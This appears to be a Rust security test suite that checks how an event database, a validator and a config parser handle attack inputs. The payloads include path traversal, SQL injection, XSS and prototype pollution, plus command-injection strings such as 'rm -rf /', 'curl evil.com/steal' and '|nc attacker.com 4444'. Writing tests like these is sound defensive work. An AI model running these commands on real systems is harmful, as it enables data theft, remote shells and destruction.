use crate::common::prelude::*;
use sinex_db::queries::insert_raw_event;
use sinex_db::validation::EventValidator;
use std::fs;

/// Security test scenario definition
#[derive(Debug, Clone)]
struct SecurityScenario {
    name: &'static str,
    category: SecurityCategory,
    payload: SecurityPayload,
    expected_behavior: ExpectedBehavior,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
enum SecurityCategory {
    PathTraversal,
    SqlInjection,
    CommandInjection,
    XssInjection,
    JsonAttack,
    UnicodeExploit,
    ResourceExhaustion,
    ConfigurationInjection,
    PrototypePollution,
    FormatString,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
enum SecurityPayload {
    String(String),
    Json(Value),
    Binary(Vec<u8>),
}

#[derive(Debug, Clone, PartialEq)]
enum ExpectedBehavior {
    Rejected,        // Should be rejected outright
    Sanitized,       // Should be accepted but sanitized
    AcceptedAsDat,   // Should be accepted as harmless data
    ResourceLimited, // Should hit resource limits
}

/// Comprehensive security attack test scenarios
fn security_scenarios() -> Vec<SecurityScenario> {
    let mut scenarios = Vec::new();

    // Path Traversal Attacks
    scenarios.extend(vec![
        SecurityScenario {
            name: "path_traversal_basic",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("../../../etc/passwd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_windows",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String(
                "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
            ),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_url_encoded",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_double_encoded",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("..%252f..%252f..%252fetc%252fpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_unicode",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
    ]);

    // SQL Injection Attacks
    scenarios.extend(vec![
        SecurityScenario {
            name: "sql_injection_drop_table",
            category: SecurityCategory::SqlInjection,
            payload: SecurityPayload::String("'; DROP TABLE events; --".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "sql_injection_or_1_equals_1",
            category: SecurityCategory::SqlInjection,
            payload: SecurityPayload::String("' OR '1'='1' --".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "sql_injection_union_select",
            category: SecurityCategory::SqlInjection,
            payload: SecurityPayload::String(
                "' UNION SELECT * FROM agent_manifests --".to_string(),
            ),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "sql_injection_time_based",
            category: SecurityCategory::SqlInjection,
            payload: SecurityPayload::String("' OR pg_sleep(5) --".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "sql_injection_stacked_queries",
            category: SecurityCategory::SqlInjection,
            payload: SecurityPayload::String(
                "'; CREATE TABLE malicious (data TEXT); --".to_string(),
            ),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // Command Injection Attacks
    scenarios.extend(vec![
        SecurityScenario {
            name: "command_injection_semicolon",
            category: SecurityCategory::CommandInjection,
            payload: SecurityPayload::String("test; rm -rf /".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "command_injection_ampersand",
            category: SecurityCategory::CommandInjection,
            payload: SecurityPayload::String("test && curl evil.com/steal".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "command_injection_backtick",
            category: SecurityCategory::CommandInjection,
            payload: SecurityPayload::String("`cat /etc/passwd`".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "command_injection_dollar",
            category: SecurityCategory::CommandInjection,
            payload: SecurityPayload::String("$(cat /etc/passwd)".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "command_injection_pipe",
            category: SecurityCategory::CommandInjection,
            payload: SecurityPayload::String("|nc attacker.com 4444".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // XSS Injection Attacks
    scenarios.extend(vec![
        SecurityScenario {
            name: "xss_script_tag",
            category: SecurityCategory::XssInjection,
            payload: SecurityPayload::Json(json!({
                "user_input": "<script>alert('xss')</script>",
                "comment": "test"
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "xss_img_onerror",
            category: SecurityCategory::XssInjection,
            payload: SecurityPayload::Json(json!({
                "html_content": "<img src=x onerror=alert('xss')>",
                "type": "image"
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "xss_javascript_url",
            category: SecurityCategory::XssInjection,
            payload: SecurityPayload::Json(json!({
                "link": "javascript:alert('xss')",
                "text": "Click me"
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // JSON Attack Scenarios
    scenarios.extend(vec![
        SecurityScenario {
            name: "json_deep_nesting",
            category: SecurityCategory::JsonAttack,
            payload: SecurityPayload::Json(create_deeply_nested_json(100)),
            expected_behavior: ExpectedBehavior::ResourceLimited,
        },
        SecurityScenario {
            name: "json_wide_object",
            category: SecurityCategory::JsonAttack,
            payload: SecurityPayload::Json(create_wide_json(10000)),
            expected_behavior: ExpectedBehavior::ResourceLimited,
        },
        SecurityScenario {
            name: "json_exponential_expansion",
            category: SecurityCategory::JsonAttack,
            payload: SecurityPayload::Json(create_exponential_json(6)),
            expected_behavior: ExpectedBehavior::ResourceLimited,
        },
        SecurityScenario {
            name: "json_circular_reference",
            category: SecurityCategory::JsonAttack,
            payload: SecurityPayload::Json(json!({
                "data": {
                    "id": 1,
                    "children": [
                        {"$ref": "#/data"},
                        {"$ref": "#/data/children/0"}
                    ]
                }
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // Unicode Exploitation
    scenarios.extend(vec![
        SecurityScenario {
            name: "unicode_null_byte",
            category: SecurityCategory::UnicodeExploit,
            payload: SecurityPayload::String("test\x00value".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "unicode_zero_width_space",
            category: SecurityCategory::UnicodeExploit,
            payload: SecurityPayload::String("ad\u{200B}min".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "unicode_right_to_left",
            category: SecurityCategory::UnicodeExploit,
            payload: SecurityPayload::String("\u{202E}nimda".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "unicode_homograph",
            category: SecurityCategory::UnicodeExploit,
            payload: SecurityPayload::String("аdmin".to_string()), // Cyrillic 'а'
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // Resource Exhaustion
    scenarios.extend(vec![
        SecurityScenario {
            name: "resource_large_string",
            category: SecurityCategory::ResourceExhaustion,
            payload: SecurityPayload::Json(json!({"data": "A".repeat(10_000_000)})),
            expected_behavior: ExpectedBehavior::ResourceLimited,
        },
        SecurityScenario {
            name: "resource_large_array",
            category: SecurityCategory::ResourceExhaustion,
            payload: SecurityPayload::Json(json!({"array": (0..1_000_000).collect::<Vec<i32>>()})),
            expected_behavior: ExpectedBehavior::ResourceLimited,
        },
    ]);

    // Prototype Pollution
    scenarios.extend(vec![
        SecurityScenario {
            name: "prototype_pollution_proto",
            category: SecurityCategory::PrototypePollution,
            payload: SecurityPayload::Json(json!({
                "__proto__": {"admin": true},
                "user": "attacker"
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "prototype_pollution_constructor",
            category: SecurityCategory::PrototypePollution,
            payload: SecurityPayload::Json(json!({
                "constructor": {"prototype": {"admin": true}},
                "user": "attacker"
            })),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    // Format String Attacks
    scenarios.extend(vec![
        SecurityScenario {
            name: "format_string_percent_s",
            category: SecurityCategory::FormatString,
            payload: SecurityPayload::String("%s%s%s%s%s%s%s%s%s%s".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
        SecurityScenario {
            name: "format_string_percent_n",
            category: SecurityCategory::FormatString,
            payload: SecurityPayload::String("%n%n%n%n%n%n%n%n%n%n".to_string()),
            expected_behavior: ExpectedBehavior::AcceptedAsDat,
        },
    ]);

    scenarios
}

/// Test all security scenarios comprehensively
#[sinex_test]
async fn test_comprehensive_security_scenarios(ctx: TestContext) -> TestResult {
    let scenarios = security_scenarios();

    let pool = ctx.pool();

    let validator = EventValidator::new();
    let mut results = SecurityTestResults::new();

    for scenario in scenarios {
        println!("\nTesting: {} ({:?})", scenario.name, scenario.category);

        match &scenario.payload {
            SecurityPayload::String(s) => {
                // Test as event source
                let event_result = timeout(
                    Duration::from_secs(3),
                    insert_raw_event(
                        &pool,
                        s,
                        "security_test",
                        "localhost",
                        json!({"scenario": scenario.name}),
                        None,
                        Some("1.0.0"),
                        None,
                    ),
                )
                .await;

                let converted_result = event_result.map_err(|e| e).map(|inner| {
                    inner.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    })
                });
                results
                    .record_string_test(&scenario, converted_result, pool)
                    .await?;

                // Test validation
                let validation_result = validator.validate_with_rules(
                    "security",
                    "test.scenario",
                    &json!({"input": s}),
                );
                results.record_validation(
                    &scenario,
                    validation_result.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    }),
                );
            }

            SecurityPayload::Json(j) => {
                // Test as payload
                let event_result = timeout(
                    Duration::from_secs(3),
                    insert_raw_event(
                        &pool,
                        "security.test",
                        scenario.name,
                        "localhost",
                        j.clone(),
                        None,
                        Some("1.0.0"),
                        None,
                    ),
                )
                .await;

                let converted_result = event_result.map_err(|e| e).map(|inner| {
                    inner.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    })
                });
                results
                    .record_json_test(&scenario, converted_result, pool)
                    .await?;
            }

            SecurityPayload::Binary(_) => {
                // Binary payloads tested separately
            }
        }
    }

    // Print comprehensive results
    results.print_summary();
    results.assert_security_requirements();

    Ok(())
}

/// Test path traversal attacks specifically
#[sinex_test]
async fn test_path_traversal_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::PathTraversal))
        .collect();

    run_security_test_batch(&ctx, "Path Traversal", scenarios).await
}

/// Test SQL injection attacks
#[sinex_test]
async fn test_sql_injection_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::SqlInjection))
        .collect();

    run_security_test_batch(&ctx, "SQL Injection", scenarios).await
}

/// Test command injection attacks
#[sinex_test]
async fn test_command_injection_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::CommandInjection))
        .collect();

    run_security_test_batch(&ctx, "Command Injection", scenarios).await
}

/// Test XSS injection attacks
#[sinex_test]
async fn test_xss_injection_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::XssInjection))
        .collect();

    run_security_test_batch(&ctx, "XSS Injection", scenarios).await
}

/// Test JSON attacks
#[sinex_test]
async fn test_json_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::JsonAttack))
        .collect();

    run_security_test_batch(&ctx, "JSON Attacks", scenarios).await
}

/// Test unicode exploits
#[sinex_test]
async fn test_unicode_exploits(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::UnicodeExploit))
        .collect();

    run_security_test_batch(&ctx, "Unicode Exploits", scenarios).await
}

/// Test resource exhaustion attacks
#[sinex_test]
async fn test_resource_exhaustion_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::ResourceExhaustion))
        .collect();

    run_security_test_batch(&ctx, "Resource Exhaustion", scenarios).await
}

/// Test prototype pollution attacks
#[sinex_test]
async fn test_prototype_pollution_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::PrototypePollution))
        .collect();

    run_security_test_batch(&ctx, "Prototype Pollution", scenarios).await
}

/// Test format string attacks
#[sinex_test]
async fn test_format_string_attacks(ctx: TestContext) -> TestResult {
    let scenarios: Vec<SecurityScenario> = security_scenarios()
        .into_iter()
        .filter(|s| matches!(s.category, SecurityCategory::FormatString))
        .collect();

    run_security_test_batch(&ctx, "Format String", scenarios).await
}

/// Helper function to run a batch of security tests
async fn run_security_test_batch(
    ctx: &TestContext,
    category_name: &str,
    scenarios: Vec<SecurityScenario>,
) -> TestResult {
    if scenarios.is_empty() {
        println!("No {} scenarios to test", category_name);
        return Ok(());
    }

    println!("\n=== Testing {} Security Scenarios ===", category_name);
    println!("Running {} test scenarios", scenarios.len());

    let pool = ctx.pool();

    let validator = EventValidator::new();
    let mut results = SecurityTestResults::new();

    for scenario in scenarios {
        println!("  Testing: {}", scenario.name);

        match &scenario.payload {
            SecurityPayload::String(s) => {
                // Test as event source
                let event_result = timeout(
                    Duration::from_secs(3),
                    insert_raw_event(
                        &pool,
                        s,
                        "security_test",
                        "localhost",
                        json!({"scenario": scenario.name}),
                        None,
                        Some("1.0.0"),
                        None,
                    ),
                )
                .await;

                let converted_result = event_result.map_err(|e| e).map(|inner| {
                    inner.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    })
                });
                results
                    .record_string_test(&scenario, converted_result, pool)
                    .await?;

                // Test validation
                let validation_result = validator.validate_with_rules(
                    "security",
                    "test.scenario",
                    &json!({"input": s}),
                );
                results.record_validation(
                    &scenario,
                    validation_result.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    }),
                );
            }

            SecurityPayload::Json(j) => {
                // Test as payload
                let event_result = timeout(
                    Duration::from_secs(3),
                    insert_raw_event(
                        &pool,
                        "security.test",
                        scenario.name,
                        "localhost",
                        j.clone(),
                        None,
                        Some("1.0.0"),
                        None,
                    ),
                )
                .await;

                let converted_result = event_result.map_err(|e| e).map(|inner| {
                    inner.map_err(|e| {
                        let error_string = format!("{}", e);
                        Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_string))
                            as Box<dyn std::error::Error>
                    })
                });
                results
                    .record_json_test(&scenario, converted_result, pool)
                    .await?;
            }

            SecurityPayload::Binary(_) => {
                // Binary payloads tested separately
            }
        }
    }

    println!("\n{} Test Results:", category_name);
    results.print_category_summary();

    // Only assert on violations for this category
    if !results.violations.is_empty() {
        println!("\nViolations detected in {} tests!", category_name);
        for violation in &results.violations {
            println!("  - {}", violation);
        }
        panic!("Security violations detected in {} tests", category_name);
    }

    Ok(())
}

/// Test filesystem path traversal attacks specifically
#[sinex_test]
async fn test_filesystem_path_traversal_comprehensive(_ctx: TestContext) -> TestResult {
    let temp_dir = TempDir::new()?;
    let watch_root = temp_dir.path();

    // Create test directory structure
    let legitimate_dir = watch_root.join("legitimate");
    fs::create_dir_all(&legitimate_dir)?;

    // Create sensitive directory outside watch root
    let sensitive_dir = temp_dir.path().parent().unwrap().join("sensitive");
    fs::create_dir_all(&sensitive_dir)?;
    fs::write(sensitive_dir.join("secret.txt"), "SECRET_DATA")?;

    let attack_paths = vec![
        "../sensitive/secret.txt",
        "..\\sensitive\\secret.txt",
        "../../sensitive/secret.txt",
        "legitimate/../../sensitive/secret.txt",
        "legitimate/../../../sensitive/secret.txt",
        "./../../sensitive/secret.txt",
        "legitimate/../sensitive/../sensitive/secret.txt",
        "%2e%2e%2fsensitive%2fsecret.txt",
        "..%252fsensitive%252fsecret.txt",
        "..%c0%afsensitive%c0%afsecret.txt",
        "../sensitive/./secret.txt",
        "../sensitive//secret.txt",
        "../sensitive\\/secret.txt",
    ];

    let mut traversal_violations = 0;

    for attack_path in &attack_paths {
        let attempted_path = watch_root.join(attack_path);

        match attempted_path.canonicalize() {
            Ok(canonical_path) => {
                if !canonical_path.starts_with(watch_root) {
                    traversal_violations += 1;
                    println!(
                        "VIOLATION: Path '{}' escaped to '{}'",
                        attack_path,
                        canonical_path.display()
                    );
                }
            }
            Err(_) => {
                // Path doesn't exist - attack blocked
                println!("Blocked: {} (path doesn't exist)", attack_path);
            }
        }

        // Test symlink attacks
        let symlink_name = format!("symlink_{}", attack_path.replace('/', "_"));
        let symlink_path = watch_root.join(&symlink_name);

        #[cfg(unix)]
        if std::os::unix::fs::symlink(&sensitive_dir, &symlink_path).is_ok() {
            if let Ok(target) = symlink_path.canonicalize() {
                if !target.starts_with(watch_root) {
                    traversal_violations += 1;
                    println!("VIOLATION: Symlink '{}' escapes watch root", symlink_name);
                }
            }
            let _ = fs::remove_file(&symlink_path);
        }
    }

    pretty_assertions::assert_eq!(
        traversal_violations,
        0,
        "Path traversal attacks should be blocked"
    );

    Ok(())
}

/// Test hash collision DoS attacks
#[sinex_test]
async fn test_hash_collision_dos(_ctx: TestContext) -> TestResult {
    let mut collision_map = HashMap::new();

    // Known hash collision strings
    let djb2_collisions = vec![
        ("hetairas", "mentioner"),
        ("heliotropes", "neurospora"),
        ("depravement", "serafins"),
        ("stylist", "subgenera"),
        ("joyful", "synaphea"),
        ("redescribed", "urites"),
    ];

    // Build large object with colliding keys
    for i in 0..1000 {
        for (key1, key2) in &djb2_collisions {
            collision_map.insert(format!("{}_{}", key1, i), format!("value1_{}", i));
            collision_map.insert(format!("{}_{}", key2, i), format!("value2_{}", i));
        }
    }

    let start = Instant::now();
    let json_value = json!(collision_map);
    let serialized = serde_json::to_string(&json_value)?;
    let serialization_time = start.elapsed();

    println!("Hash collision test results:");
    println!("  Object size: {} keys", collision_map.len());
    println!("  Serialization time: {:?}", serialization_time);
    println!("  Serialized size: {} bytes", serialized.len());

    // Test deserialization
    let start = Instant::now();
    let _: Value = serde_json::from_str(&serialized)?;
    let deserialization_time = start.elapsed();
    println!("  Deserialization time: {:?}", deserialization_time);

    // Both should complete quickly despite collisions
    assert!(
        serialization_time < Duration::from_secs(1),
        "Serialization too slow - potential DoS vulnerability"
    );
    assert!(
        deserialization_time < Duration::from_secs(1),
        "Deserialization too slow - potential DoS vulnerability"
    );

    Ok(())
}

/// Test JSON parser differential attacks
#[sinex_test]
async fn test_json_parser_differential(_ctx: TestContext) -> TestResult {
    let tricky_json_strings = vec![
        (
            r#"{"key": 1.0000000000000000000000000000000001}"#,
            "precision_loss",
        ),
        (r#"{"key": 9007199254740993}"#, "beyond_js_safe_integer"),
        (r#"{"key": "\uD800"}"#, "unpaired_surrogate"),
        (r#"{"key": "\u0000"}"#, "null_character"),
        (r#"{"a": 1, "a": 2}"#, "duplicate_keys"),
        (r#"{"key": -0}"#, "negative_zero"),
        (r#"{"key": 1e308}"#, "large_number"),
        (r#"{"key": 1e-308}"#, "small_number"),
    ];

    println!("JSON parser differential test:");
    for (json_str, description) in tricky_json_strings {
        match serde_json::from_str::<Value>(json_str) {
            Ok(val) => {
                println!(
                    "  {} - Parsed: {}",
                    description,
                    serde_json::to_string(&val).unwrap_or_default()
                );
            }
            Err(e) => {
                println!("  {} - Rejected: {}", description, e);
            }
        }
    }

    Ok(())
}

/// Test malicious TOML configuration injection
#[sinex_test]
#[ignore = "Security validation not fully implemented yet - TODO: implement proper config validation"]
async fn test_configuration_injection(_ctx: TestContext) -> TestResult {
    let temp_dir = TempDir::new()?;
    let config_dir = temp_dir.path().join("config");
    fs::create_dir_all(&config_dir)?;

    let malicious_configs = vec![
        (
            "command_injection",
            r#"
            [event_sources.filesystem]
            watch_paths = ["/tmp; rm -rf /; echo"]
            "#,
        ),
        (
            "path_traversal",
            r#"
            [event_sources.filesystem]
            watch_paths = ["../../../etc/passwd"]
            "#,
        ),
        (
            "regex_dos",
            r#"
            [routing.rules]
            pattern = "(a+)+"
            "#,
        ),
        (
            "toml_bomb",
            r#"
            [a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.x.y.z]
            value = "deep"
            "#,
        ),
        (
            "unicode_attack",
            r#"
            [event_sources]
            name = "test\u0000\u0001\u0002\ufeff"
            "#,
        ),
    ];

    let mut config_violations = Vec::new();

    for (name, config) in malicious_configs {
        let config_file = config_dir.join(format!("{}.toml", name));
        fs::write(&config_file, config)?;

        match fs::read_to_string(&config_file).and_then(|content| {
            toml::from_str::<toml::Value>(&content)
                .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))
        }) {
            Ok(parsed) => {
                let config_str = format!("{:?}", parsed);

                if config_str.contains("/etc/passwd")
                    || config_str.contains("; rm -rf")
                    || config_str.contains("\u{0000}")
                {
                    config_violations.push(format!("{}: dangerous content not sanitized", name));
                }

                println!("Config '{}' parsed (needs validation)", name);
            }
            Err(e) => {
                println!("Config '{}' rejected: {}", name, e);
            }
        }
    }

    if !config_violations.is_empty() {
        println!("Configuration security violations:");
        for violation in &config_violations {
            println!("  - {}", violation);
        }
    }

    assert!(
        config_violations.is_empty(),
        "Configuration injection vulnerabilities detected"
    );

    Ok(())
}

/// Helper to create deeply nested JSON
fn create_deeply_nested_json(depth: usize) -> Value {
    if depth == 0 {
        json!("base")
    } else {
        json!({
            "level": depth,
            "nested": create_deeply_nested_json(depth - 1)
        })
    }
}

/// Helper to create wide JSON object
fn create_wide_json(width: usize) -> Value {
    let mut object = serde_json::Map::new();
    for i in 0..width {
        object.insert(format!("key_{}", i), json!(format!("value_{}", i)));
    }
    Value::Object(object)
}

/// Helper to create exponentially expanding JSON
fn create_exponential_json(levels: usize) -> Value {
    let mut json = json!(["base"]);

    for _ in 1..levels {
        json = json!([json.clone(), json.clone()]);
    }

    json
}

/// Results tracking for security tests
struct SecurityTestResults {
    total_tests: usize,
    rejected: usize,
    sanitized: usize,
    accepted_as_data: usize,
    resource_limited: usize,
    violations: Vec<String>,
}

impl SecurityTestResults {
    fn new() -> Self {
        Self {
            total_tests: 0,
            rejected: 0,
            sanitized: 0,
            accepted_as_data: 0,
            resource_limited: 0,
            violations: Vec::new(),
        }
    }

    async fn record_string_test(
        &mut self,
        scenario: &SecurityScenario,
        result: Result<
            Result<sinex_db::RawEvent, Box<dyn std::error::Error>>,
            tokio::time::error::Elapsed,
        >,
        pool: &DbPool,
    ) -> TestResult {
        self.total_tests += 1;

        match result {
            Ok(Ok(event)) => {
                // Check what was actually stored
                let stored: String = sqlx::query_scalar!(
                    "SELECT source FROM raw.events WHERE id = $1::uuid::ulid",
                    event.id.to_uuid()
                )
                .fetch_one(pool)
                .await?;

                if let SecurityPayload::String(original) = &scenario.payload {
                    if stored != *original {
                        self.sanitized += 1;
                        if scenario.expected_behavior != ExpectedBehavior::Sanitized {
                            self.violations.push(format!(
                                "{}: Expected {:?} but was sanitized",
                                scenario.name, scenario.expected_behavior
                            ));
                        }
                    } else {
                        self.accepted_as_data += 1;
                        if scenario.expected_behavior != ExpectedBehavior::AcceptedAsDat {
                            self.violations.push(format!(
                                "{}: Expected {:?} but was accepted as data",
                                scenario.name, scenario.expected_behavior
                            ));
                        }
                    }
                }

                // Check for dangerous content
                if stored.contains("DROP TABLE") || stored.contains("/etc/passwd") {
                    self.violations.push(format!(
                        "{}: Dangerous content stored without sanitization",
                        scenario.name
                    ));
                }
            }
            Ok(Err(_)) => {
                self.rejected += 1;
                if scenario.expected_behavior != ExpectedBehavior::Rejected {
                    self.violations.push(format!(
                        "{}: Expected {:?} but was rejected",
                        scenario.name, scenario.expected_behavior
                    ));
                }
            }
            Err(_) => {
                self.resource_limited += 1;
                if scenario.expected_behavior != ExpectedBehavior::ResourceLimited {
                    self.violations.push(format!(
                        "{}: Expected {:?} but hit resource limit",
                        scenario.name, scenario.expected_behavior
                    ));
                }
            }
        }

        Ok(())
    }

    async fn record_json_test(
        &mut self,
        scenario: &SecurityScenario,
        result: Result<
            Result<sinex_db::RawEvent, Box<dyn std::error::Error>>,
            tokio::time::error::Elapsed,
        >,
        _pool: &DbPool,
    ) -> TestResult {
        self.total_tests += 1;

        match result {
            Ok(Ok(_event)) => {
                self.accepted_as_data += 1;
                if scenario.expected_behavior != ExpectedBehavior::AcceptedAsDat {
                    self.violations.push(format!(
                        "{}: Expected {:?} but was accepted",
                        scenario.name, scenario.expected_behavior
                    ));
                }
            }
            Ok(Err(_)) => {
                self.rejected += 1;
                if scenario.expected_behavior != ExpectedBehavior::Rejected {
                    self.violations.push(format!(
                        "{}: Expected {:?} but was rejected",
                        scenario.name, scenario.expected_behavior
                    ));
                }
            }
            Err(_) => {
                self.resource_limited += 1;
                if scenario.expected_behavior != ExpectedBehavior::ResourceLimited {
                    self.violations.push(format!(
                        "{}: Expected {:?} but hit resource limit",
                        scenario.name, scenario.expected_behavior
                    ));
                }
            }
        }

        Ok(())
    }

    fn record_validation(&mut self, scenario: &SecurityScenario, result: TestResult) {
        match result {
            Ok(_) => {
                println!("  Validation passed for {}", scenario.name);
            }
            Err(e) => {
                println!("  Validation failed for {}: {}", scenario.name, e);
            }
        }
    }

    fn print_summary(&self) {
        println!("\n=== Security Test Summary ===");
        println!("Total tests run: {}", self.total_tests);
        println!(
            "Rejected: {} ({:.1}%)",
            self.rejected,
            self.rejected as f64 / self.total_tests as f64 * 100.0
        );
        println!(
            "Sanitized: {} ({:.1}%)",
            self.sanitized,
            self.sanitized as f64 / self.total_tests as f64 * 100.0
        );
        println!(
            "Accepted as data: {} ({:.1}%)",
            self.accepted_as_data,
            self.accepted_as_data as f64 / self.total_tests as f64 * 100.0
        );
        println!(
            "Resource limited: {} ({:.1}%)",
            self.resource_limited,
            self.resource_limited as f64 / self.total_tests as f64 * 100.0
        );

        if !self.violations.is_empty() {
            println!("\nSecurity Violations ({}):", self.violations.len());
            for violation in &self.violations {
                println!("  - {}", violation);
            }
        } else {
            println!("\n✓ All security tests passed as expected");
        }
    }

    fn print_category_summary(&self) {
        println!("  Tests run: {}", self.total_tests);
        println!("  Rejected: {}", self.rejected);
        println!("  Sanitized: {}", self.sanitized);
        println!("  Accepted as data: {}", self.accepted_as_data);
        println!("  Resource limited: {}", self.resource_limited);

        if self.total_tests > 0 {
            let acceptance_rate =
                (self.accepted_as_data + self.sanitized) as f64 / self.total_tests as f64 * 100.0;
            println!("  Overall acceptance rate: {:.1}%", acceptance_rate);
        }
    }

    fn assert_security_requirements(&self) {
        assert!(
            self.violations.is_empty(),
            "Security test violations detected: {:?}",
            self.violations
        );
    }
}
